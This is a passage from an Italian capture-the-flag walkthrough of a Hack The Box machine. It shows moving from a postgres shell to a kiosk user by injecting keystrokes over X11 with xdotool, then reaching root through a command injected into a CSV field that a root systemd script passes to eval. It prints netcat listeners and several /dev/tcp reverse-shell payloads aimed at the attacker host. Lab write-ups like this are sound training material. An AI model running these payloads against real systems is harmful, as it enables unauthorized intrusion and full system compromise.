Lo script aprirà una reverse shell verso il nostro Parrot sulla porta `5555`.

Su **Parrot** avviamo Netcat:

```bash
nc -lvnp 5555
```
### 8.6 Scarichiamo xdotool su Parrot

Apriamo un terminale su Parrot e creiamo una directory:

```bash
mkdir -p /tmp/xdotool-htb
cd /tmp/xdotool-htb
```

Scarichiamo i due pacchetti necessari per Ubuntu 22.04:

```bash
curl -fLO https://archive.ubuntu.com/ubuntu/pool/universe/x/xdotool/xdotool_3.20160805.1-4_amd64.deb
curl -fLO https://archive.ubuntu.com/ubuntu/pool/universe/x/xdotool/libxdo3_3.20160805.1-4_amd64.deb
```

Il primo contiene il programma `xdotool`, mentre il secondo contiene la libreria `libxdo3` necessaria al suo funzionamento.

Avviamo un server HTTP per trasferire i file:

```bash
python3 -m http.server 8001
```
### 8.7 Trasferiamo ed estraiamo xdotool sul target

Dalla shell `postgres` creiamo una directory temporanea:

```bash
mkdir -p /tmp/xdotool-local
cd /tmp/xdotool-local
```

Scarichiamo i due pacchetti dal server HTTP di Parrot:

```bash
curl -fO http://10.10.15.73:8001/xdotool_3.20160805.1-4_amd64.deb
curl -fO http://10.10.15.73:8001/libxdo3_3.20160805.1-4_amd64.deb
```

Estraiamo i file:

```bash
for file in *.deb; do
    dpkg-deb -x "$file" .
done
```

`dpkg-deb -x` estrae il contenuto dei pacchetti nella directory corrente, **senza installarli e senza richiedere privilegi root**.

Rendiamo disponibile il programma:

```bash
export PATH="/tmp/xdotool-local/usr/bin:$PATH"
export LD_LIBRARY_PATH="/tmp/xdotool-local/usr/lib/x86_64-linux-gnu:${LD_LIBRARY_PATH:-}"
export DISPLAY=:0
```

Adesso possiamo utilizzare `xdotool` dalla shell `postgres`.
### 8.8 Apriamo un terminale come dutyfree-kiosk

Eseguiamo:

```bash
xdotool key ctrl+alt+t
```

Questo comando simula `Ctrl+Alt+T`.

Openbox intercetta la combinazione e apre un terminale `xterm` con i privilegi di `dutyfree-kiosk`.
### 8.9 Selezioniamo il terminale ed eseguiamo la reverse shell

Attendiamo che la finestra venga aperta:

```bash
sleep 2
```

Selezioniamo il terminale e gli assegniamo il focus della tastiera:

```bash
xdotool search --sync --onlyvisible --class xterm windowactivate --sync windowfocus --sync
```

Questo comando cerca una finestra `xterm` visibile, la attiva e le assegna il focus. Se sono aperti più terminali `xterm`, è preferibile selezionare esplicitamente quello appena creato.

Ora facciamo digitare il comando che avvia la reverse shell:

```bash
xdotool type --clearmodifiers --delay 80 'bash /tmp/duty.sh'
xdotool key Return
```

Il primo comando scrive nel terminale:

```bash
bash /tmp/duty.sh
```

Il secondo simula la pressione di Invio.

Lo script `/tmp/duty.sh`, già preparato nel punto precedente, apre una reverse shell verso Parrot sulla porta `5555`.
### 8.10 Otteniamo la shell come dutyfree-kiosk

Sul listener Netcat di Parrot riceviamo la connessione.

Verifichiamo:

```bash
whoami
id
```

Risultato:

```text
dutyfree-kiosk
uid=1000(dutyfree-kiosk) gid=1000(dutyfree-kiosk) groups=1000(dutyfree-kiosk),1001(pos-ops)
```

**Abbiamo ottenuto una shell come** `dutyfree-kiosk` **sfruttando X11 e XTEST, senza utilizzare script Python.
Nella cartella** `/home/dutyfree-kiosk` **troviamo la user flag**
## 9. Privilege Escalation: da dutyfree-kiosk a root

Ora che siamo `dutyfree-kiosk`, cerchiamo un modo per ottenere i privilegi di `root`.
### 9.1 Individuiamo un servizio systemd

Esaminiamo i servizi personalizzati presenti sulla macchina:

```
ls /etc/systemd/system/
```

Tra i risultati troviamo:

```
vrs-duty-apply.path
vrs-duty-apply.service
```

Sono servizi personalizzati, quindi vale la pena esaminarli.

Leggiamo il primo file:

```
cat /etc/systemd/system/vrs-duty-apply.path
```

La parte importante è:

```
[Path]
PathModified=/opt/vrs/data/duty-rates.csv
Unit=vrs-duty-apply.service
```

Questo significa che **quando viene modificato il file** `**duty-rates.csv**`**, systemd avvia automaticamente** `**vrs-duty-apply.service**`.

Vediamo che cosa esegue questo servizio:

```
cat /etc/systemd/system/vrs-duty-apply.service
```

Troviamo:

```
[Service]
Type=oneshot
EnvironmentFile=/etc/airsnacksdf/db.env
ExecStart=/opt/vrs/bin/apply-duty-rates.sh
```

Il servizio esegue quindi:

```
/opt/vrs/bin/apply-duty-rates.sh
```

Non essendo specificato un utente con `User=`, il servizio viene eseguito come **root**.

Analizziamo lo script.
### 9.2 Scopriamo la vulnerabilità Bash

Eseguiamo:

```
cat /opt/vrs/bin/apply-duty-rates.sh
```

Le parti interessanti sono:

```
RATES="/opt/vrs/data/duty-rates.csv"
```

e

```
while IFS=, read -r tax_class duty_pct vat_pct; do
    (( ++lineno ))

    if [[ -z "$tax_class" || -z "$duty_pct" || -z "$vat_pct" ]]; then
        echo "apply-duty-rates: line $lineno: missing field" >&2
        exit 1
    fi

    if ! [[ "$duty_pct" =~ ^[0-9]+$ && "$vat_pct" =~ ^[0-9]+$ ]]; then
        echo "apply-duty-rates: line $lineno: rate must be numeric" >&2
        exit 1
    fi

    eval "${tax_class}=${duty_pct}"

done < "$RATES"
```

Lo script legge il file CSV **duty-rates.csv** contenente le aliquote fiscali.

Vediamo com'è fatto:

```
cat /opt/vrs/data/duty-rates.csv
```

Risultato:

```
SPIRITS,45,20
WINE,25,20
BEER,25,20
SOFT_DRINKS,20,20
SNACKS,20,20
CONFECTIONERY,20,20
WATER,0,0
```

Ogni riga contiene tre valori separati da virgole.

Per esempio:

```
SPIRITS,45,20
```

Viene interpretata così:

```
tax_class = SPIRITS
duty_pct  = 45
vat_pct   = 20
```

Poi lo script esegue:

```
eval "${tax_class}=${duty_pct}"
```

Che diventa:

```
eval "SPIRITS=45"
```

**La vulnerabilità è l'utilizzo di** `**eval**`**.**

`eval` interpreta il testo ricevuto come un comando Bash.

Lo script controlla che i due valori numerici siano corretti, ma non controlla che `tax_class` contenga soltanto il nome di una categoria.

Se possiamo modificare il CSV, possiamo inserire comandi Bash all'interno di `tax_class`.

Poiché lo script viene eseguito come root, anche questi comandi verranno eseguiti come root.
### 9.3 Verifichiamo i permessi del CSV

Eseguiamo:

```
ls -l /opt/vrs/data/duty-rates.csv
```

Risultato:

```
-rw-rw-r-- root pos-ops duty-rates.csv
```

Il file può essere modificato dal proprietario `root` e dagli utenti appartenenti al gruppo `pos-ops`.

Ricordiamo che siamo diventati `dutyfree-kiosk` e che il comando `id` ci aveva mostrato:

```
groups=1000(dutyfree-kiosk),1001(pos-ops)
```

**Possiamo quindi modificare il CSV.**

Abbiamo tutti gli elementi necessari per ottenere una shell root.
## 10. Sfruttiamo la Command Injection

### 10.1 Prepariamo Netcat

Su Parrot apriamo un nuovo terminale:

```
nc -lvnp 6666
```

Vogliamo fare eseguire allo script systemd una reverse shell verso questa porta.

Il comando che utilizzeremo è:

```
bash -c 'bash -i >& /dev/tcp/10.10.15.73/6666 0>&1'
```
### 10.2 Modifichiamo il CSV

Sostituiamo la prima riga del file con un payload Bash:

```
cat > /opt/vrs/data/duty-rates.csv <<'EOF'
SPIRITS=45;bash -c 'bash -i >& /dev/tcp/10.10.15.73/6666 0>&1';#,45,20
WINE,25,20
BEER,25,20
SOFT_DRINKS,20,20
SNACKS,20,20
CONFECTIONERY,20,20
WATER,0,0
EOF
```

La riga originale era:

```
SPIRITS,45,20
```

Quella modificata è:

```
SPIRITS=45;bash -c 'bash -i >& /dev/tcp/10.10.15.73/6666 0>&1';#,45,20
```

Vediamo perché funziona.

Lo script divide la nuova riga in tre parti:

```
tax_class = SPIRITS=45;bash -c 'bash -i >& /dev/tcp/10.10.15.73/6666 0>&1';#
duty_pct  = 45
vat_pct   = 20
```

Gli ultimi due valori sono ancora numerici, quindi superano il controllo.

Quando lo script esegue:

```
eval "${tax_class}=${duty_pct}"
```

Bash interpreta:

```
SPIRITS=45;bash -c 'bash -i >& /dev/tcp/10.10.15.73/6666 0>&1';#=45
```

Il comando viene interpretato così:

- `SPIRITS=45`: assegna il valore alla variabile.
- `;`: termina il primo comando.
- `bash -c '...'`: esegue la nostra reverse shell.
- `#`: commenta il resto della riga, impedendo che `=45` interferisca con il comando.

**Abbiamo inserito una Command Injection che verrà eseguita come root.**
### 10.3 Attiviamo il servizio systemd

Ricordiamo che `vrs-duty-apply.path` monitora le modifiche del CSV:

```
PathModified=/opt/vrs/data/duty-rates.csv
```

Quando abbiamo modificato il file, systemd ha rilevato il cambiamento e avviato:

```
vrs-duty-apply.service
```

Il servizio ha eseguito:

```
/opt/vrs/bin/apply-duty-rates.sh
```

Lo script ha letto il nostro payload e lo ha interpretato attraverso `eval`  inviando la reverse shell sulla nostra porta `6666`.
## 11. Accesso root

Sul listener Netcat di Parrot eseguiamo:

```
whoami
id
```

Risultato:

```
root
uid=0(root) gid=0(root) groups=0(root)
```

**Abbiamo ottenuto una shell root.**

Nella cartella **/root** troviamo la root flag.

La macchina è completata.
